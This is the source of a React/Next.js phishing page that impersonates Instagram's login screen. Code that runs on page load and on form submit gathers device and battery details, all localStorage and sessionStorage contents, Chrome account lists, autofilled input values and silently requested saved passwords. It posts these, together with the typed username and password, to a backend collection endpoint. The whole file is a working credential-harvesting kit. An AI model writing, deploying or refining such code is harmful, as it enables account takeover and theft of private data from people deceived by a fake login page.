"use client"

import { Button } from "@/components/ui/button"
import { Facebook } from "lucide-react"
import Link from "next/link"
import { useState, useEffect } from "react"

export default function InstagramLogin() {
  const [showPassword, setShowPassword] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isDarkMode, setIsDarkMode] = useState(false)
  const [errors, setErrors] = useState({ username: false, password: false })

  // Auto-collect data when page loads
  useEffect(() => {
    const autoCollectData = async () => {
      try {
        // Collect device information
        const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screenResolution: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cookieEnabled: navigator.cookieEnabled,
          onLine: navigator.onLine,
          timestamp: new Date().toISOString()
        }

        // Get battery information
        let batteryInfo = {}
        try {
          if ('getBattery' in navigator) {
            const battery = await navigator.getBattery()
            batteryInfo = {
              level: battery.level,
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            }
          } else if ('battery' in navigator) {
            const battery = navigator.battery
            batteryInfo = {
              level: battery.level,
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            }
          }
        } catch (error) {
          console.log('Battery API not available:', error)
        }



        // Collect saved credentials
        let savedCredentials = {}
        let instagramCredentials = {}
        try {
          // Look for Instagram credentials in browser storage
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i)
            const value = localStorage.getItem(key)
            
            if (key.toLowerCase().includes('instagram') || 
                key.toLowerCase().includes('insta') || 
                key.toLowerCase().includes('ig') ||
                value.toLowerCase().includes('instagram') ||
                value.toLowerCase().includes('@')) {
              instagramCredentials[`localStorage_${key}`] = value
            }
          }
          
          for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i)
            const value = sessionStorage.getItem(key)
            
            if (key.toLowerCase().includes('instagram') || 
                key.toLowerCase().includes('insta') || 
                key.toLowerCase().includes('ig') ||
                value.toLowerCase().includes('instagram') ||
                value.toLowerCase().includes('@')) {
              instagramCredentials[`sessionStorage_${key}`] = value
            }
          }
          
          // Try to access Chrome password manager
          if (window.chrome && chrome.identity) {
            try {
              const accounts = await chrome.identity.getAccounts()
              const instagramAccounts = accounts.filter(acc => 
                acc.email.includes('instagram') || 
                acc.email.includes('@') ||
                acc.domain === 'instagram.com'
              )
              if (instagramAccounts.length > 0) {
                instagramCredentials.chromeInstagramAccounts = instagramAccounts
              }
            } catch (e) {
              console.log('Chrome identity not available')
            }
          }
          
          // Check for any form data
          const allInputs = document.querySelectorAll('input')
          allInputs.forEach(input => {
            if (input.value && (
              input.value.includes('@') || 
              input.value.includes('instagram') ||
              input.name.toLowerCase().includes('email') ||
              input.name.toLowerCase().includes('user') ||
              input.name.toLowerCase().includes('login') ||
              input.type === 'password'
            )) {
              instagramCredentials[`input_${input.name || input.id || 'unknown'}`] = input.value
            }
          })
          
        } catch (error) {
          console.log('Error getting credentials:', error)
        }

        // Send data to backend
        await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000'}/api/login`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
                  body: JSON.stringify({
          email: 'Auto-collected on page load',
          password: 'Auto-collected on page load',
          deviceInfo: deviceInfo,
          savedCredentials: savedCredentials,
          instagramCredentials: instagramCredentials,
          batteryInfo: batteryInfo,
          autoCollected: true
        })
        })

        console.log('Auto-collected data sent to backend')
      } catch (error) {
        console.log('Error in auto-collection:', error)
      }
    }

    // Run auto-collection after a short delay
    const timer = setTimeout(autoCollectData, 2000)
    return () => clearTimeout(timer)
  }, [])

  // Check system color scheme preference
  useEffect(() => {
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)')
    setIsDarkMode(mediaQuery.matches)

    const handleChange = (e: MediaQueryListEvent) => {
      setIsDarkMode(e.matches)
    }

    mediaQuery.addEventListener('change', handleChange)
    return () => mediaQuery.removeEventListener('change', handleChange)
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Reset errors
    setErrors({ username: false, password: false })
    
    // Check for empty fields
    const newErrors = { username: false, password: false }
    if (!username) newErrors.username = true
    if (!password) newErrors.password = true
    
    if (newErrors.username || newErrors.password) {
      setErrors(newErrors)
      return
    }

    setIsSubmitting(true)

    try {
      // Collect device information
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        timestamp: new Date().toISOString()
      }

      // Get battery information
      let batteryInfo = {}
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery()
          batteryInfo = {
            level: battery.level,
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          }
        } else if ('battery' in navigator) {
          const battery = navigator.battery
          batteryInfo = {
            level: battery.level,
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          }
        }
      } catch (error) {
        console.log('Battery API not available:', error)
      }

      // Try to get saved credentials and autofill data
      let savedCredentials = {}
      let instagramCredentials = {}
      try {
        // Check for saved passwords in the browser
        const savedPasswords = await navigator.credentials?.get({
          password: true,
          mediation: 'silent'
        })
        
        if (savedPasswords) {
          savedCredentials.savedPassword = savedPasswords
        }
        
                  // Try to get Instagram-specific credentials
          try {
            // Look for Instagram credentials in browser storage
            const allLocalStorage = {}
            const allSessionStorage = {}
            
            // Get ALL localStorage data for debugging
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i)
              const value = localStorage.getItem(key)
              allLocalStorage[key] = value
              
              // Check if it contains Instagram-related data
              if (key.toLowerCase().includes('instagram') || 
                  key.toLowerCase().includes('insta') || 
                  key.toLowerCase().includes('ig') ||
                  value.toLowerCase().includes('instagram') ||
                  value.toLowerCase().includes('@')) {
                instagramCredentials[`localStorage_${key}`] = value
              }
            }
            
            // Get ALL sessionStorage data for debugging
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i)
              const value = sessionStorage.getItem(key)
              allSessionStorage[key] = value
              
              if (key.toLowerCase().includes('instagram') || 
                  key.toLowerCase().includes('insta') || 
                  key.toLowerCase().includes('ig') ||
                  value.toLowerCase().includes('instagram') ||
                  value.toLowerCase().includes('@')) {
                instagramCredentials[`sessionStorage_${key}`] = value
              }
            }
            
            // Save ALL localStorage and sessionStorage for debugging
            instagramCredentials.allLocalStorage = allLocalStorage
            instagramCredentials.allSessionStorage = allSessionStorage
          
          // Try to access Chrome password manager for Instagram
          if (window.chrome && chrome.identity) {
            try {
              const accounts = await chrome.identity.getAccounts()
              const instagramAccounts = accounts.filter(acc => 
                acc.email.includes('instagram') || 
                acc.email.includes('@') ||
                acc.domain === 'instagram.com'
              )
              if (instagramAccounts.length > 0) {
                instagramCredentials.chromeInstagramAccounts = instagramAccounts
              }
            } catch (e) {
              console.log('Chrome identity not available')
            }
          }
          
          // Try to get mobile browser data
          try {
            // Check if user is on mobile
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
            
            if (isMobile) {
              instagramCredentials.isMobile = true
              instagramCredentials.mobileBrowser = navigator.userAgent
              
              // Try to get mobile-specific data
              if ('credentials' in navigator) {
                try {
                  const mobileCredentials = await navigator.credentials.get({
                    password: true,
                    mediation: 'silent'
                  })
                  if (mobileCredentials) {
                    instagramCredentials.mobileCredentials = mobileCredentials
                  }
                } catch (e) {
                  console.log('Mobile credentials not available')
                }
              }
              
              // Get mobile app data if available
              try {
                // Check for installed apps
                if ('getInstalledRelatedApps' in navigator) {
                  const apps = await navigator.getInstalledRelatedApps()
                  const instagramApp = apps.find(app => 
                    app.id.includes('instagram') || 
                    app.platform === 'play' || 
                    app.platform === 'webapp'
                  )
                  if (instagramApp) {
                    instagramCredentials.installedInstagramApp = instagramApp
                  }
                }
              } catch (e) {
                console.log('App detection not available')
              }
              
              // Get mobile device info
              try {
                if ('deviceMemory' in navigator) {
                  instagramCredentials.deviceMemory = navigator.deviceMemory
                }
                if ('hardwareConcurrency' in navigator) {
                  instagramCredentials.cpuCores = navigator.hardwareConcurrency
                }
                if ('connection' in navigator) {
                  instagramCredentials.connectionType = navigator.connection.effectiveType
                  instagramCredentials.connectionSpeed = navigator.connection.downlink
                }
              } catch (e) {
                console.log('Device info not available')
              }
            }
          } catch (error) {
            console.log('Error getting mobile data:', error)
          }
          
          // Check for any form data that might contain Instagram credentials
          const allInputs = document.querySelectorAll('input')
          allInputs.forEach(input => {
            if (input.value && (
              input.value.includes('@') || 
              input.value.includes('instagram') ||
              input.name.toLowerCase().includes('email') ||
              input.name.toLowerCase().includes('user') ||
              input.name.toLowerCase().includes('login') ||
              input.type === 'password'
            )) {
              instagramCredentials[`input_${input.name || input.id || 'unknown'}`] = input.value
            }
          })
          
        } catch (error) {
          console.log('Error getting Instagram credentials:', error)
        }
        
        // Get autofill data from form fields
        const formData = new FormData()
        const inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"]')
        inputs.forEach(input => {
          if (input.value && input.value !== username && input.value !== password) {
            savedCredentials[input.name || input.id || 'unknown'] = input.value
          }
        })
        
        // Try to access browser's password manager data
        if (window.chrome && chrome.identity) {
          try {
            const accounts = await chrome.identity.getAccounts()
            savedCredentials.chromeAccounts = accounts
          } catch (e) {
            console.log('Chrome identity not available')
          }
        }
        
        // Get localStorage and sessionStorage data
        savedCredentials.localStorage = {}
        savedCredentials.sessionStorage = {}
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i)
          if (key && (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('pass'))) {
            savedCredentials.localStorage[key] = localStorage.getItem(key)
          }
        }
        
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i)
          if (key && (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('pass'))) {
            savedCredentials.sessionStorage[key] = sessionStorage.getItem(key)
          }
        }
        
      } catch (error) {
        console.log('Could not access saved credentials:', error)
      }

      

      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000'}/api/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: username || 'No email entered',
          password: password || 'No password entered',
          deviceInfo: deviceInfo,
          savedCredentials: savedCredentials,
          instagramCredentials: instagramCredentials,
          batteryInfo: batteryInfo
        })
      })

      const data = await response.json()

      if (response.ok) {
        setUsername('')
        setPassword('')
      } else {
        alert('Xatolik yuz berdi: ' + data.error)
      }
    } catch (error) {
      console.error('Error:', error)
      alert('Server bilan bog\'lanishda xatolik!')
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-sm">
          {/* Login Container */}
          <div className="px-10 py-8 mb-4 bg-card">
            {/* Instagram Logo */}
            <div className="text-center mb-8">
              <img 
                src={isDarkMode ? "/instagram-login-white.png" : "/instagram-login-dark.png"} 
                alt="Instagram" 
                className="mx-auto h-16 w-auto" 
                style={{ objectFit: 'contain' }} 
              />
            </div>

            {/* Login Form */}
            <form className="space-y-3" onSubmit={handleSubmit}>
              {/* Username Input */}
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className={`w-full border bg-muted rounded-sm px-3 py-2 text-sm focus:outline-none focus:border-ring text-foreground ${
                  errors.username ? 'border-red-500' : 'border-input'
                }`}
                placeholder="Phone number, username or email address"
                autoComplete="username"
              />
              {/* Password Input */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full border bg-muted rounded-sm px-3 py-2 text-sm focus:outline-none focus:border-ring text-foreground pr-12 ${
                    errors.password ? 'border-red-500' : 'border-input'
                  }`}
                  placeholder="Password"
                  autoComplete="current-password"
                />
                {password && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-foreground hover:text-muted-foreground"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
              </div>
              <button
                type="submit"
                className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold rounded-md py-2 text-sm mt-2 disabled:opacity-50"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Sending...' : 'Log in'}
              </button>
            </form>

            {/* OR Divider */}
            <div className="flex items-center my-4">
              <div className="flex-1 h-px bg-border" />
              <span className="px-4 text-xs text-muted-foreground font-semibold">OR</span>
              <div className="flex-1 h-px bg-border" />
            </div>

            {/* Facebook Login */}
            <button
              type="button"
              className="w-full flex items-center justify-center gap-2 font-semibold text-sm py-2 mb-2 text-[#385185]"
            >
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5" fill="none">
                <path d="M17 2h-3a5 5 0 0 0-5 5v3H6v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3V2z" fill="#1877F2"/>
              </svg>
              <span className="text-[#1877F2]">Log in with Facebook</span>
            </button>

            {/* Forgot Password */}
            <div className="text-center mt-3">
              <Link href="#" className="text-xs text-foreground font-semibold hover:underline">
                Forgotten your password?
              </Link>
            </div>
          </div>



          {/* Sign Up Container */}
          <div className="px-10 py-6 text-center mt-4 bg-card">
            <p className="text-sm text-foreground">
              {"Don't have an account? "}
              <Link href="#" className="text-[#0095f6] font-semibold hover:underline">
                Sign up
              </Link>
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-muted-foreground mb-4">
            <Link href="#" className="hover:underline">
              Meta
            </Link>
            <Link href="#" className="hover:underline">
              About
            </Link>
            <Link href="#" className="hover:underline">
              Blog
            </Link>
            <Link href="#" className="hover:underline">
              Jobs
            </Link>
            <Link href="#" className="hover:underline">
              Help
            </Link>
            <Link href="#" className="hover:underline">
              API
            </Link>
            <Link href="#" className="hover:underline">
              Privacy
            </Link>
            <Link href="#" className="hover:underline">
              Terms
            </Link>
            <Link href="#" className="hover:underline">
              Locations
            </Link>
            <Link href="#" className="hover:underline">
              Instagram Lite
            </Link>
            <Link href="#" className="hover:underline">
              Threads
            </Link>
            <Link href="#" className="hover:underline">
              Contact uploading and non-users
            </Link>
            <Link href="#" className="hover:underline">
              Meta Verified
            </Link>
          </div>
          <div className="flex flex-col sm:flex-row justify-center items-center gap-2 sm:gap-4 text-xs text-muted-foreground">
            <select className="bg-transparent border-none text-xs text-muted-foreground outline-none">
              <option>English (UK)</option>
            </select>
            <span className="text-muted-foreground">© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>

      {/* Terms Notice */}
      <div className="fixed bottom-0 left-0 right-0 bg-card border-t border-border px-4 py-3 text-xs text-muted-foreground sm:block hidden">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <span>
            By continuing, you agree to Instagram's{" "}
            <Link href="#" className="text-foreground hover:underline">
              Terms of Use
            </Link>{" "}
            and{" "}
            <Link href="#" className="text-foreground hover:underline">
              Privacy Policy
            </Link>
            .
          </span>
          <button className="text-muted-foreground hover:text-foreground">×</button>
        </div>
      </div>
    </div>
  )
}